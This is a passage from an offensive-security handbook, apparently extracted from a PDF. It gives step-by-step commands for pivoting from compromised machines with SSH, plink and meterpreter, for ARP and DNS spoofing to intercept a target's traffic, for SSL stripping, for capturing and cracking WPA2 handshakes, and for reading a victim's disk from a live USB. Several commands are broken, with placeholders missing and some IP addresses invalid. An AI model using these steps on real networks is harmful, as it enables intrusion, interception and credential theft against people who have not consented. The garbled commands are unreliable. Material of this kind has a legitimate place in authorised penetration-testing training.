apt-get install rinetd
This is the default config file /etc/rinetd.conf:
#
# this is the configuration file for rinetd, the internet redirection server
#
# you may specify global allow and deny rules here
# only ip addresses are matched, hostnames cannot be specified here
# the wildcards you may use are * and ?
#
# allow 192.168.2.*
# deny 192.168.2.1?
#
# forwarding rules come here
#
# you may specify allow and deny rules after a specific forwarding rule
# to apply to only that forwarding rule
#
# bindadress bindport connectaddress connectport
# logging information
logfile /var/log/rinetd.log
# uncomment the following line if you want web-server style logfile format
# logcommon
This is the essential part of the configuration file, this is where we create the port-forwarding
# bindadress bindport connectaddress connectport
111.111.111.111 80 333.333.333.333 21
/etc/init.d/rinetd restart
So the bind-address is where the proxy receieves the connection, and the connectaddress is the
machine it forwards the connection to.
SSH Tunneling - Port forwarding on SSH
Use cases
You want to encrypt traffic that uses unencrypted protocols. Like VNC, IMAP, IRC.
You are on a public network and want to encrypt all your http traffic.
You want to bypass firewall rules.
220
Pivoting - Port forwarding - Tunneling
Local port forwarding
Now facebook will be available on address localhost:8080.
ssh -L 8080:www.facebook.com:80 localhost
You can also forward ports like this:
ssh username@ -L localport:target-ip:target-port
ssh PI:EMAIL -L 5000:192.168.1.222:5000
Now this port will be available on your localhost. So you go to:
nc localhost:10000
Remote port forwarding
Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a
machine, and that machine has like MYSQL running but it is only accessible for localhost. And you
can't access it because you have a really crappy shell. So what we can do is just forward that port to
our attacking machine. The steps are as following:
Here is how you create a remote port forwarding:
ssh  -R ::
By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the
attacking machine is 111.111.111.111.
Step 1 So on our compromised machine we do:
plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
Step 2 Now we can check netstat on our attacking machine, we should see something like this:
tcp 0 0 127.0.0.1:3307 0.0.0.0:* LISTEN 19392/sshd: root@pt
That means what we can connect to that port on the attacking machine from the attacking machine.
Step 3 Connect using the following command:
mysql -u root -p -h 127.0.0.1 --port=3307
Dynamic port forwarding
This can be used to dynamically forward all traffic from a specific application. This is really cool.
With remote and local port forwarding you are only forwarding a single port. But that can be a hassle
if your target machine has 10 ports open that you want to connect to. So instad we can use a dynamic
port forwarding technique.
Dynamic port forwarding sounds really complicated, but it is incredibly easy to set up. Just set up the
tunnel like this. After it is set up do not run any commands in that session.
# We connect to the machine we want to pivot from
ssh -D 9050 PI:EMAIL
221
Pivoting - Port forwarding - Tunneling
Since proxychains uses 9050 by defualt (the default port for tor) we don't even need to configure
proxychains. But if you want to change the port you can do that in /etc/proxychains.conf.
proxychains nc 192.168.2.222 21
So supress all the logs from proxychains you can configure it in the config file.
Tunnel all http/https traffic through ssh
For this we need two machines. Machine1 - 111.111.1111.111 - The server that works as our proxy.
Machine2 - The computer with the web browser.
First we check out what out public IP adress is, so that we know the IP address before and after, so we
can verify that it works. First you set ssh to:
# On Machine2 we run
ssh -D localhost:9999 PI:EMAIL
# Can also be run with the -N flag
ssh -D localhost:9999 PI:EMAIL -N
Now you go to Firefox/settings/advanced/network and SOCKS you add 127.0.0.1 and port 9999
Notice that this setup probably leaks DNS. So don't use it if you need opsec.
To fix the DNS-leak you can go to about:config in firefox (in the addressbar) then look for
network.proxy.socks_remote_dns, and switch it to TRUE. Now you can check: https://ipleak.net/
But we are not done yet. It still says that we have WebRTC leaks. In order to solve this you can go to
about:config again and set the following to FALSE
media.peerconnection.enabled
SShuttle
I haven't used this, but it might work.
sshuttle -r PI:EMAIL 192.168.1.0/24
Port forward with metasploit
We can also forward ports using metasploit. Say that the compromised machine is running services
that are only accessible from within the network, from within that machine. To access that port we can
do this in meterpreter:
portfwd add -l  -p  -r 
portfwd add -l 3306 -p 3306 -r 192.168.222
Now we can access this port on our machine locally like this.
nc 127.0.0.1 3306
Ping-sweep the network
222
Pivoting - Port forwarding - Tunneling
First we want to scan the network to see what devices we can target. In this example we already have
a meterpreter shell on a windows machine with SYSTEM-privileges.
meterpreter > run arp_scanner -r 192.168.1.0/24
This command will output all the devices on the netowork.
Scan each host
Now that we have a list of all available machines. We want to portscan them.
We will to that portscan through metasploit. Using this module:
use auxiliary/scanner/portscan/tcp
If we run that module now it will only scan machines in the network we are already on. So first we
need to connect us into the second network.
On the already pwn machine we do
ipconfig
Now we add the second network as a new route in metasploit. First we background our session, and
then do this:
# the ip addres and the subnet mask, and then the meterpreter session
route add 192.168.1.101 255.255.255.0 1
Now we can run our portscanning module:
use auxiliary/scanner/portscan/tcp
Attack a specific port
In order to attack a specific port we need to forwards it like this
portfwd add -l 3389 -p 3389 -r 192.168.1.222
References
This is a good video-explanation:
https://www.youtube.com/watch?v=c0XiaNAkjJA
https://www.offensive-security.com/metasploit-unleashed/pivoting/
http://ways2hack.com/how-to-do-pivoting-attack/
223
Network traffic analysis
Network traffic analysis
Network traffic
So you have entered a network and it is time to start mapping it. It is probably a good idea to start
monitoring the traffic.
224
Arp-spoofing
Arp-spoofing
Arp-spoofing - Sniffing traffic
Step 1
Run nmap or netdiscover to list the devices on the network. netdiscover -r
192.168.1.0/24 or whatever network range it is. This is good because it is live, and it updates as
soon as new devices connect to the network.
nmap -vvv 192.168.1.0/24
Step 2
echo 1 > /proc/sys/net/ipv4/ip_forward
this command is fundamental. Without changing it to 1you will only block the traffic, but not forward
it. So that will bring down the connection for that person. Denial of service. If you want to do that
make sure it is set to 0. If you want to intercept it make sure it is set to 1.
Step 3
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.105
-i is the interface flag. In this example we choose the wlan0 interface. Run ifconfig to see
which interfaces you have available.
-t the target flag. It specifies your target. The first address is the router, and the second is the
specific device you want to target.
Step 4 - Read the traffic
So now you are intercepting the traffic. You have a few choices how to read it. Use urlsnarf.
urlsnarf -i wlan0
it will output all URLs.
driftnet -i wlan0
Driftnet is pretty cool. It let's you see all the images that is loaded in the targets browser in real time.
Not very useful, but kind of cool.
wireshark. Just open wireshark and select the interface and start capturing.
Tcpdump. Also awesome.
225
SSL-strip
SSL-strip
SSL-strip
If the user you are intercepting is communicating over HTTPS your interception will trigger an alert
very time a user tried to enter a https-page. This is not what we want. In order do bypass this we can
remove the ssl-part of every request. It is less likely that the user will notice a change from HTTPS to
HTTP in the url-bar.
Reference
Penteration Testing - A hands on introduction to hacking. Page 174
226
DNS-spoofing
DNS-spoofing
DNS-spoofing
This attack can also me called DNS cache posining. This attack is also performed on a already
compromised network. It is pretty much like Arp-spoofing. But instead of relying traffic we are
directing the user to visit a fake web-site that we have set up.
We set up a webpage that is a clone of facebook.com. We intercept the dns-traffic, and everytime the
target sends a request to a dns-server to resolve facebook.com we intercept that request and directs the
user to our clone.
227
Wireshark
Wireshark
Wireshark
So now that you have entered a network and intercepted the traffic it is time to analyze that traffic.
That can be with wireshark.
Filters
There are two types of filters that we can use.
1. Capture filter
This filters out in the capture process, so that it does not capture what you have not
specified.
2. Display filter
This filter just filters what you see. You might have captured 1000 packets, but using the
display filter you will only be shown say 100 packets that are relevant to you.
The syntax for the two filters are a bit different.
Capture filter
So if you just start capturing all traffic on a network you are soon going to get stuck with a ton of
packets. Too many! So we might need to refine out capture.
Click on the fourth icon from the left. If you hover over it it says Capture options
Some useful might be. From a specific host and with a specific port:
host 192.168.1.102
port 110
Display filter
Show only packets used by this IP-address, or to a specific port
ip.addr == 192.168.1.102
tcp.port eq 25
Automatically resolve ip-addresses
Easy https://ask.wireshark.org/questions/37680/can-wireshark-automatically-resolve-the-ip-address-
into-host-names
228
Wifi
Wifi
Wifi
There are quite a few different security mechanism on wifi. And each of them require a different
tactic. This article outlines the different strategies quite well. http://null-byte.wonderhowto.com/how-
to/hack-wi-fi-selecting-good-wi-fi-hacking-strategy-0162526/
This is a great guide to the many different ways to hack wifi.
Checking what networks are avalible
sudo iwlist wlan0 scanning - scans for wifis
Hacking WPA2-wifis Using airmon-ng and cowpatty
What we are going to to here it basically just to record the 4-way handshake and then run a dictionary
attack on it. The good part about this strategy is that you won't have to interfere to much with the
network and thereby risk of taking down their wifi. The bad part is that if you run a dictionary attack
there is always the possibility that the password just isn't in the list.
1. Start airmon-ng
airmon-ng start wlan0
This puts the network card in monitoring mode.
This will create a network interface that you can use to monitor wifi-action. This
interface is usually called mon0 or something like that. You see the name when you run
the command.
2. Run airodump to see what is passing through the air
Now we want to see what access points are available to us.
airodump-ng -i mon0
This would output something like this:
CH 13 ][ Elapsed: 6 s ]
BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
E8:DE:27:31:15:EE -62 40 54 0 11 54e WPA2 CCMP PSK myrouter
A7:B6:68:D4:1D:91 -80 7 0 0 11 54e WPA2 CCMP PSK DKT_D24D81
B4:EE:B4:80:76:72 -84 5 0 0 6 54e WPA2 CCMP PSK arrisNetwork
BSSID STATION PWR Rate Lost Frames Probe
E8:DE:27:31:15:EE D8:A2:5E:8E:41:75 -57 0e- 1 537 14
So what is all this? BSSID - This is the mac-address of the access point. PWR - Signal strength. The
higher (closer to 0) the strength the stronger is the signal. In the example above it is myrouter that has
the strongest signal. Beacon - This is kind of like a packet that the AP sends out periodically. The
229
Wifi
beacon contains information about the network. It contains the SSID, timestamp, beacon interval. If
you are curious you can just analyze the beacons in wireshark after you have captured them. #Data -
The number of data-packets that has been sent. #/s - Number of data-packets per second. CH -
Channel MB - Maximum speed the AP can handle. ENC - Encryption type CIPHER - One of CCMP,
WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and
CCMP is typically used with WPA2. PSK - The authentication protocol used. One of MGT
(WPA/WPA2 using a separate authentication server), SKA (shared key for WEP), PSK (pre-shared
key for WPA/WPA2), or OPN (open for WEP). ESSID - The name of the network
Then we have another section of information. Station - MAC address of each associated station or
stations searching for an AP to connect with. Clients not currently associated with an AP have a
BSSID of “(not associated)”. So yeah, this basically means that we can see what devices are looking
for APs. This can be useful if we want to create an evil twin or something like that.
1. Find the network you want to access.
airodump-ng --bssid A7:B6:68:D4:1D:91 -c 11 -w cowpatty
mon0
So this command will record or traffic from the device with that specific MAC-address. -
c defines the channel. and -w cowpatty means that we are going to save the packet
capture with that name. Now we just have to wait for a user to connect to that network.
And when he/she does we will record that handshake. We know that we have recorded a
handshake when this appears CH 11 ][ Elapsed: 19 hours 52 mins ][
2016-05-19 17:14 ][ WPA handshake: A7:B6:68:D4:1D:91 Now we
can exit airodump, and we can see that we have a cap-file with the name cowpatty-
01.cap. That is our packet-capture, and you can open it and study it in wireshark if you
like.
2. Crack the password.
3. Now that we have the handshake recorded we can start to crack it. We can do that by using the
program cowpatty.
4. cowpatty -f /usr/share/wordlists/rockyou.txt -r cowpatty-01.cap
-s DKT_D24D81 Then we just hope for the best.
More
Kicking other people off the network to capture handshakes faster: http://www.aircrack-
ng.org/doku.php?id=newbie_guide
http://lewiscomputerhowto.blogspot.cl/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html
http://radixcode.com/hackcrack-wifi-password-2015-step-step-tutorial/
230
WEP
WEP
231
WPS
WPS
WPS
232
Physical access to machine
Physical access to machine
Physical access to machine
So if you have physical access to a machine that is not encrypted it is really trivial to gain access to
the hard-drive and all files on it.
This is how you do it
Create linux-usb
Just follow this guide for ubuntu http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-
ubuntu
Boot into live-usb on victim machine
If the machine doesn't automatically detect the usb you might have to enter into the bios. This can
usually be done by pressing F12 or F1 on boot. Bios looks different from machine to machine. But
you need to just choose to boot from the USB-device.
Mount disk
Now you have booted into the live-usb, now we need to mount the hard-drive to the usb-linux-
filesystem. First we want to find out what partitions we have:
sudo su
fdisk -l
This will give you a list of partitions. They will look something like this
/dev/sda1
/dev/sda2
Identify from the list the partition you want to mount.
Here we create a space for where we want to mount the partition.
mkdir /media/windows
mount -t ntfs /dev/sda1 /media/windows
-tmeans type, and refers to the filesystem-type. And we choose ntfs which is the windows-
filesystem.
Now you can access all the files from the harddrive in /media/windows
Umount the disk
Notice that is is umount and not unmount.
233
Physical access to machine
umount /media/windows
Dump the hashes
https://prakharprasad.com/windows-password-cracking-using-john-the-ripper/
234
Literature
Literature
Literature
Zines
2600: The Hacker Quarterly
https://www.2600.com/
Go null yourself
http://web.textfiles.com/ezines/GONULLYOURSELF/gonullyourself1.txt
Hacking with Kali
https://archive.org/stream/HackingWithKali/Hacking%20with%20Kali_djvu.txt
Books
Hacking - The Art of Exploitation
Pentesting - A Hands-On Introduction to Hacking by Georgia Weidman
235